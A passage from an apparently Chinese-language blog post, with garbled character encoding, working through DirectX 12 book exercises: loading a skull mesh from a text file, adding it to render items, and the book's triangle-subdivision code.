            ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
            ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span>  ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> ri<span class="token operator">-></span><span class="token function">World</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
            
cmdList<span class="token operator">-></span><span class="token function">SetGraphicsRoot32BitConstants</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">,</span> srcData<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//color.hlsl</span>
<span class="token comment">/*
è¿™ä¸ªæ²¡ä»€ä¹ˆå¥½æ”¹çš„
*/</span>
cbuffer cbPerObject <span class="token operator">:</span> <span class="token keyword">register</span><span class="token punctuation">(</span>b0<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	float4x4 gWorld<span class="token punctuation">;</span> 
<span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
<span class="token comment">// èŠ±äº†å‡ ä¸ªå°æ—¶ï¼Œå°±å› ä¸ºè¿™ä¸ªé¡ºåºã€‚ã€‚ã€‚è¿˜å¾—æ˜¯åŠ¨è°ƒ</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="7-9-3"><a href="#7-9-3" class="headerlink" title="7.9.3"></a>7.9.3</h3><p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220316125456736.png" alt="image-20220316125456736"></p>
<p><img src="https://cdn.jsdelivr.net/gh/wr-web/picture/image-20220316123341882.png" alt="image-20220316123341882"></p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/*
Summary:  ä»ä¸€å®šæ ¼å¼çš„æ–‡ä»¶ä¸­è¯»å–é¡¶ç‚¹å’Œç´¢å¼•
Parameters:
	path: è·¯å¾„
	numSubdivisions: ç»†åˆ†æ¬¡æ•°,ä¼¼ä¹è¿™ä¸ªå›¾åƒä¸å¤ªèƒ½ç»§ç»­ç»†åˆ†äº†
*/</span>

MeshData <span class="token function">CreateFromFile</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> path<span class="token punctuation">,</span> uint32 numSubdivisions<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

GeometryGenerator<span class="token double-colon punctuation">::</span>MeshData <span class="token class-name">GeometryGenerator</span><span class="token double-colon punctuation">::</span><span class="token function">CreateFromFile</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span> path<span class="token punctuation">,</span> uint32 numSubdivisions<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	MeshData meshData<span class="token punctuation">;</span>
	<span class="token keyword">float</span> pos<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">float</span> normal<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">uint32_t</span> tlist<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">char</span> mystr<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
	<span class="token keyword">uint64_t</span> vertexCount<span class="token punctuation">;</span>
	<span class="token keyword">uint64_t</span> triangleCount<span class="token punctuation">;</span>

	std<span class="token double-colon punctuation">::</span>ifstream <span class="token function">infile</span><span class="token punctuation">(</span>path<span class="token punctuation">,</span> std<span class="token double-colon punctuation">::</span>ios<span class="token double-colon punctuation">::</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>infile<span class="token punctuation">.</span><span class="token function">is_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		infile <span class="token operator">>></span> mystr <span class="token operator">>></span> vertexCount<span class="token punctuation">;</span>
		infile <span class="token operator">>></span> mystr <span class="token operator">>></span> triangleCount<span class="token punctuation">;</span>

		infile<span class="token punctuation">.</span><span class="token function">getline</span><span class="token punctuation">(</span>mystr<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		infile<span class="token punctuation">.</span><span class="token function">getline</span><span class="token punctuation">(</span>mystr<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		infile<span class="token punctuation">.</span><span class="token function">getline</span><span class="token punctuation">(</span>mystr<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">while</span> <span class="token punctuation">(</span>vertexCount<span class="token operator">--</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			infile <span class="token operator">>></span> pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> infile <span class="token operator">>></span> pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> infile <span class="token operator">>></span> pos<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
			infile <span class="token operator">>></span> normal<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span> infile <span class="token operator">>></span> normal<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span> infile <span class="token operator">>></span> normal<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
			Vertex vertex <span class="token operator">=</span> <span class="token function">Vertex</span><span class="token punctuation">(</span>
				pos<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pos<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> pos<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
				normal<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> normal<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> normal<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span>
				<span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">,</span>
				<span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			meshData<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>vertex<span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>

		infile<span class="token punctuation">.</span><span class="token function">getline</span><span class="token punctuation">(</span>mystr<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		infile<span class="token punctuation">.</span><span class="token function">getline</span><span class="token punctuation">(</span>mystr<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		infile<span class="token punctuation">.</span><span class="token function">getline</span><span class="token punctuation">(</span>mystr<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		infile<span class="token punctuation">.</span><span class="token function">getline</span><span class="token punctuation">(</span>mystr<span class="token punctuation">,</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">while</span> <span class="token punctuation">(</span>triangleCount<span class="token operator">--</span><span class="token punctuation">)</span>
		<span class="token punctuation">&#123;</span>
			infile <span class="token operator">>></span> tlist<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">>></span> tlist<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">>></span> tlist<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
			meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>tlist<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>tlist<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>tlist<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token punctuation">&#125;</span>

		infile<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
	<span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">auto</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> numSubdivisions<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
		<span class="token function">Subdivide</span><span class="token punctuation">(</span>meshData<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>

	<span class="token keyword">return</span> meshData<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç„¶åè¦ä¿®æ”¹ä¸€ä¸‹ BuildShapeGeometry</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">GeometryGenerator<span class="token double-colon punctuation">::</span>MeshData skull <span class="token operator">=</span> geoGen<span class="token punctuation">.</span><span class="token function">CreateFromFile</span><span class="token punctuation">(</span><span class="token string">"C:\\Users\\orz10\\ROOT\\directx12\\d3d12book\\Chapter 7 Drawing in Direct3D Part II\\Shapes\\skull.txt"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//...</span>
UINT skullIndexOffset <span class="token operator">=</span> cylinderIndexOffset <span class="token operator">+</span> <span class="token punctuation">(</span>UINT<span class="token punctuation">)</span>cylinder<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//...</span>
SubmeshGeometry skullSubmesh<span class="token punctuation">;</span>
skullSubmesh<span class="token punctuation">.</span>IndexCount <span class="token operator">=</span> <span class="token punctuation">(</span>UINT<span class="token punctuation">)</span>skull<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
skullSubmesh<span class="token punctuation">.</span>StartIndexLocation <span class="token operator">=</span> skullIndexOffset<span class="token punctuation">;</span>
skullSubmesh<span class="token punctuation">.</span>BaseVertexLocation <span class="token operator">=</span> skullVertexOffset<span class="token punctuation">;</span>
<span class="token comment">//...</span>
<span class="token keyword">auto</span> totalVertexCount <span class="token operator">=</span>
    box<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>
    grid<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>
    sphere<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>
    cylinder<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span>
    skull<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//æ¥ä¸€æ‰‹é»‘è‰²éª¨å¤´ï¼Œæˆ‘å‘ç°ç™½è‰²çš„æ›´å¸¦åŠ²</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span>size_t i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> skull<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">,</span> <span class="token operator">++</span>k<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
    vertices<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>Pos <span class="token operator">=</span> skull<span class="token punctuation">.</span>Vertices<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>Position<span class="token punctuation">;</span>
    vertices<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">.</span>Color <span class="token operator">=</span> <span class="token function">XMFLOAT4</span><span class="token punctuation">(</span>DirectX<span class="token double-colon punctuation">::</span>Colors<span class="token double-colon punctuation">::</span>Black<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//...</span>
geo<span class="token operator">-></span>DrawArgs<span class="token punctuation">[</span><span class="token string">"skull"</span><span class="token punctuation">]</span> <span class="token operator">=</span> skullSubmesh<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœ€åæŠŠ BuildRenderItems æ”¹ä¸€ä¸‹å°±å¥½äº†ï¼Œè¿™ä¸ªæ‹·è´äº†æ•°æ®ç»™è¦ç”»çš„ mOpaqueRitemsï¼Œç®—æ˜¯æœ€åä¸€æ­¥äº†ã€‚</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">auto</span> skullRitem <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token generic-function"><span class="token function">make_unique</span><span class="token generic class-name"><span class="token operator">&lt;</span>RenderItem<span class="token operator">></span></span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">XMStoreFloat4x4</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>skullRitem<span class="token operator">-></span>World<span class="token punctuation">,</span> <span class="token function">XMMatrixScaling</span><span class="token punctuation">(</span><span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">,</span> <span class="token number">1.0f</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token function">XMMatrixTranslation</span><span class="token punctuation">(</span><span class="token number">0.0f</span><span class="token punctuation">,</span> <span class="token operator">-</span><span class="token number">1.5f</span><span class="token punctuation">,</span> <span class="token number">0.0f</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  skullRitem<span class="token operator">-></span>ObjCBIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  skullRitem<span class="token operator">-></span>Geo <span class="token operator">=</span> mGeometries<span class="token punctuation">[</span><span class="token string">"shapeGeo"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  skullRitem<span class="token operator">-></span>PrimitiveType <span class="token operator">=</span> D3D_PRIMITIVE_TOPOLOGY_TRIANGLELIST<span class="token punctuation">;</span>
  skullRitem<span class="token operator">-></span>IndexCount <span class="token operator">=</span> skullRitem<span class="token operator">-></span>Geo<span class="token operator">-></span>DrawArgs<span class="token punctuation">[</span><span class="token string">"skull"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>IndexCount<span class="token punctuation">;</span>
  skullRitem<span class="token operator">-></span>StartIndexLocation <span class="token operator">=</span> skullRitem<span class="token operator">-></span>Geo<span class="token operator">-></span>DrawArgs<span class="token punctuation">[</span><span class="token string">"skull"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>StartIndexLocation<span class="token punctuation">;</span>
  skullRitem<span class="token operator">-></span>BaseVertexLocation <span class="token operator">=</span> skullRitem<span class="token operator">-></span>Geo<span class="token operator">-></span>DrawArgs<span class="token punctuation">[</span><span class="token string">"skull"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>BaseVertexLocation<span class="token punctuation">;</span>
  mAllRitems<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>std<span class="token double-colon punctuation">::</span><span class="token function">move</span><span class="token punctuation">(</span>skullRitem<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="7-9-X"><a href="#7-9-X" class="headerlink" title="7.9.X"></a>7.9.X</h3><p>å…³äºè¿™ä¸ªæ›²é¢ç»†åˆ†æˆ‘æœ‰ç‚¹è¿·ç³Šï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæœ‰äº›æ˜¾ç¤ºä¸äº†äº†</p>
<pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// æ‘˜æŠ„</span>
<span class="token keyword">void</span> <span class="token class-name">GeometryGenerator</span><span class="token double-colon punctuation">::</span><span class="token function">Subdivide</span><span class="token punctuation">(</span>MeshData<span class="token operator">&amp;</span> meshData<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token comment">// Save a copy of the input geometry.</span>
	MeshData inputCopy <span class="token operator">=</span> meshData<span class="token punctuation">;</span>


	meshData<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">resize</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//       v1</span>
	<span class="token comment">//       *</span>
	<span class="token comment">//      / \
	//     /   \
	//  m0*-----*m1</span>
	<span class="token comment">//   / \   / \
	//  /   \ /   \
	// *-----*-----*</span>
	<span class="token comment">// v0    m2     v2</span>

	uint32 numTris <span class="token operator">=</span> <span class="token punctuation">(</span>uint32<span class="token punctuation">)</span>inputCopy<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">size</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">/</span><span class="token number">3</span><span class="token punctuation">;</span>
	<span class="token keyword">for</span><span class="token punctuation">(</span>uint32 i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> numTris<span class="token punctuation">;</span> <span class="token operator">++</span>i<span class="token punctuation">)</span>
	<span class="token punctuation">&#123;</span>
		Vertex v0 <span class="token operator">=</span> inputCopy<span class="token punctuation">.</span>Vertices<span class="token punctuation">[</span> inputCopy<span class="token punctuation">.</span>Indices32<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
		Vertex v1 <span class="token operator">=</span> inputCopy<span class="token punctuation">.</span>Vertices<span class="token punctuation">[</span> inputCopy<span class="token punctuation">.</span>Indices32<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>
		Vertex v2 <span class="token operator">=</span> inputCopy<span class="token punctuation">.</span>Vertices<span class="token punctuation">[</span> inputCopy<span class="token punctuation">.</span>Indices32<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token punctuation">]</span><span class="token punctuation">;</span>

		<span class="token comment">//</span>
		<span class="token comment">// Generate the midpoints.</span>
		<span class="token comment">//</span>

        Vertex m0 <span class="token operator">=</span> <span class="token function">MidPoint</span><span class="token punctuation">(</span>v0<span class="token punctuation">,</span> v1<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Vertex m1 <span class="token operator">=</span> <span class="token function">MidPoint</span><span class="token punctuation">(</span>v1<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        Vertex m2 <span class="token operator">=</span> <span class="token function">MidPoint</span><span class="token punctuation">(</span>v0<span class="token punctuation">,</span> v2<span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token comment">//</span>
		<span class="token comment">// Add new geometry.</span>
		<span class="token comment">//</span>

		meshData<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v0<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 0</span>
		meshData<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 1</span>
		meshData<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 2</span>
		meshData<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>m0<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 3</span>
		meshData<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>m1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 4</span>
		meshData<span class="token punctuation">.</span>Vertices<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>m2<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 5</span>
 
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		meshData<span class="token punctuation">.</span>Indices32<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>i<span class="token operator">*</span><span class="token number">6</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æŠŠä¸¤ä¸ªç‚¹çš„æ‰€æœ‰å±æ€§å¹³åˆ†äº†ã€‚æœ€ä¸ºå…³é”®çš„æ˜¯ MidPoint ä¸­å­˜åœ¨  XMVECTOR pos &#x3D; 0.5f*(p0 + p1);<br>è¿™ä¸ªæˆ‘è§‰å¾—æœ‰ä¸€ç‚¹ç‚¹ä¸åˆç†ï¼Œä¸è¿‡å¯¹äºå¹³é¢æ¥è¯´æ˜¯æ²¡é—®é¢˜çš„ã€‚è¿™é‡Œæš‚æ—¶ä¹Ÿæ˜¯åªæ˜¯ç”¨åˆ°äº†æ­£æ–¹ä½“ä¸­ã€‚</p>
]]></content>
      <categories>
        <category>DX12</category>
      </categories>
      <tags>
        <tag>directX 12</tag>
